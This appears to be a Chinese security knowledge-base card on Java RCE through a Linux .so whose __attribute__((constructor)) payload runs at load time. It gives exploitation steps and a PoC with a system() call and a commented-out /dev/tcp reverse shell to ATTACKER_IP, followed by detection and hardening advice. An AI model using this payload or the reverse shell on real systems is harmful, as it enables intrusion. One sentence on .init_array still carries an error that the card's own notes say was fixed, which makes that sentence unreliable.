---
id: web-java-rce-elf-constructor-load-time-exec
title: ELF __attribute__((constructor))：Linux .so 被 dlopen 时经 .init_array 自动执行
type: scenario
domain: web
path: web/java/rce
technique: elf-attribute-constructor-load-time-execution
tags:
- java
- jni
- native-library
- elf
- constructor
- init-array
- linux
- load-time
- payload
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-1
  verified_at: '2026-11-08T00:19:25+08:00'
  notes: 已对照 content.md 与 img/04 核对：__attribute__((constructor)) 段 C 代码与卡内 PoC 结构一致；img/04 为 IDE 中 Exp.java 仅 static{ System.loadLibrary("libcmd"); } + 空 main，运行后弹出计算器，与卡内「dlopen 返回前执行、无需 JNI 符号」一致。已修正三点：① 原文该段载荷也是 system()（会起子进程），卡内已改为「不经过 Java 层 hook 但 native 层有子进程痕迹」；② 卡内 PoC 的 touch marker 与反弹 shell 行属扩展示例，已标注「非原文默认载荷」；③ 原「.init_array 等价于旧式 __attribute__((constructor))」属笔误，已改为「旧式写法是 .ctors 段」。受影响版本不适用。未在本机编译/加载任何 so。
url: /docs/web/java/rce/web-java-rce-elf-constructor-load-time-exec/
draft: false
kb_aliases:
- __attribute__((constructor)) 执行命令
- ELF 构造函数 加载即执行
- init_array 载入期执行
- .so 构造函数 反弹 shell
- GCC constructor 属性
---

## 一句话结论

在 Linux 上把载荷函数标记为 `__attribute__((constructor))`（GCC/Clang 扩展）编译成 `.so`，动态链接器的 `.init_array` 会在库被 `dlopen`（即 `System.load`/`System.loadLibrary`）映射进进程后、返回调用方之前自动执行它；因此一个只含构造函数的 `.so` 被 JVM 加载时会立即执行代码，不需要导出任何 `Java_` 符号、不需要 `JNI_OnLoad`、目标 Java 类也不需要声明过 `native` 方法。

## 原理

- GCC/Clang 的 `__attribute__((constructor))` 把函数地址写入 ELF 的 `.init_array`（等价于旧式 `__attribute__((constructor))` 或 `.ctors`）；动态链接器执行 `dlopen` 时按 `.init_array` 顺序调用这些函数，属于 ELF 装载协议的一部分，与 JNI 规范无关。
- 该执行时机在 `dlopen` 返回之前，早于 JVM 的符号解析，所以「库是否能被 JVM 使用」不影响载荷执行：即使库里没有任何 JNI 符号、加载后 JVM 随后报 `UnsatisfiedLinkError`，构造函数已经跑过了。
- 因此判断攻击是否成功不能只看 Java 是否抛异常或进程退出码，要看构造函数产生的副作用（marker 文件、弹窗、外连、命令输出）。
- 载荷在 JVM 进程内运行：用 `popen`/`system`/`execl` 直接执行命令；这些调用会在 native 层 `fork`+`execve` 起子进程，不经过 Java 层 `Runtime`/`ProcessBuilder` 的 RASP hook，但子进程痕迹依然存在。
- 与 `JNI_OnLoad` 的差别：`JNI_OnLoad` 需要 JVM 主动查找导出符号；构造函数只依赖动态链接器的装载流程，因此对「加载方是否按 JNI 协议处理」不敏感，只要执行了 `dlopen` 就会跑。Windows 上对应的是 `DllMain`。
- 编译约束：`-fPIC -shared`；`constructor` 是 GCC/Clang 扩展，MSVC 不支持（Windows 端要走 `DllMain`）。

## 触发条件

- 目标为 Linux 上的 JVM，且存在可控的原生库加载点（`System.load`/`System.loadLibrary`、JNA 解包、框架加载）。
- 攻击者能把编译好的 `.so` 落地到目标机，架构/位数（`x86_64`/`aarch64`）匹配。
- 进程对落地的库有读权限；加载点所在目录可写或库名可控。
- 目标容器/主机允许 `dlopen`（无 `noexec` 挂载限制的库路径、未禁用原生库加载）。

## 利用步骤

1. 确认加载点与 `java.library.path`（`System.getProperty("java.library.path")`、启动脚本、挂载目录）。
2. 写只含构造函数的 C 文件（可选带 `#include "Xxx.h"`，但无需实现任何 `Java_` 符号）。
3. `gcc -fPIC -shared -o libcmd.so evil.c`（无需 JDK 头文件，除非同时要实现 JNI 方法）；确认 `readelf -S libcmd.so | grep init_array` 存在且指向载荷函数。
4. 落地库文件；走 `loadLibrary` 时命名为 `lib<name>.so` 并放进 `java.library.path`；走 `System.load` 时可用绝对路径（含上传目录）。
5. 触发加载，不调用任何方法；检查构造函数副作用（marker/外连/命令输出）。
6. 若 Java 侧随后报 `UnsatisfiedLinkError`，这是预期现象，不代表利用失败。

## PoC

```c
#include <stdio.h>
#include <stdlib.h>

void __attribute__((constructor)) onload_payload(void) {
    // 最小验证：留下 marker
    system("touch /tmp/elf-ctor-ok");
    // 反弹 shell 形态（常见扩展用法）
    // system("/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1");
}
```

```bash
gcc -fPIC -shared -o libcmd.so evil.c
readelf -S libcmd.so | grep -i init_array
readelf -s libcmd.so | grep onload_payload
```

```java
public class LoadOnly {
    static { System.load("/tmp/libcmd.so"); }   // 或 System.loadLibrary("cmd")
    public static void main(String[] args) { }
}
```

```bash
# 验证
ls -l /tmp/elf-ctor-ok        # 存在即证明构造函数已执行
```

## 变体与关联

- 变体：静态链接到可执行文件时构造函数在 `main()` 之前运行（同一机制的另一场景，不属 JVM 加载链）。
- 变体：用 `.init_array` 手工段属性（`__attribute__((section(".init_array")))` + 函数指针）实现，效果等价于 `constructor`。
- 变体：与 `JNI_OnLoad` 混用——构造函数做「加载即执行」，`JNI_OnLoad` 里 `RegisterNatives` 供后续调用。
- 关联：`[[web-java-rce-jni-onload-export-load-time-exec]]`（JVM 主动调用的入口）、`[[web-java-rce-windows-dllmain-load-time-exec]]`（Windows 入口）；`[[pentest-privilege-escalation-jna-tmpdir-native-lib-replacement]]` 把该入口用于竞态替换提权。
- 边界：目标为 Windows（`constructor` 不生效，需 `DllMain`）、库架构不匹配、加载点不可达或目录不可写、`noexec`/只读挂载、容器禁止原生库时失败。

## 检测与防御

- 检测：`dlopen` 的目标 `.so` 不在应用依赖目录（上传目录、`/tmp`、共享挂载）；`readelf`/`nm` 可见 `.init_array` 含非常规函数；进程加载后立即出现子进程或外连。
- 检测：`java.library.path` 含可写目录；上传接口出现 `.so` 且随后被加载；Java 侧报 `UnsatisfiedLinkError` 但进程已有异常副作用。
- 修复：禁止用户可控的 `System.load`/`System.loadLibrary`；原生能力改为服务端预置 + 哈希/签名校验。
- 加固：`java.library.path` 只读；上传目录与服务目录分离；以低权限账号运行 JVM；`audit`/EDR 监控 `dlopen` 路径与子进程创建。
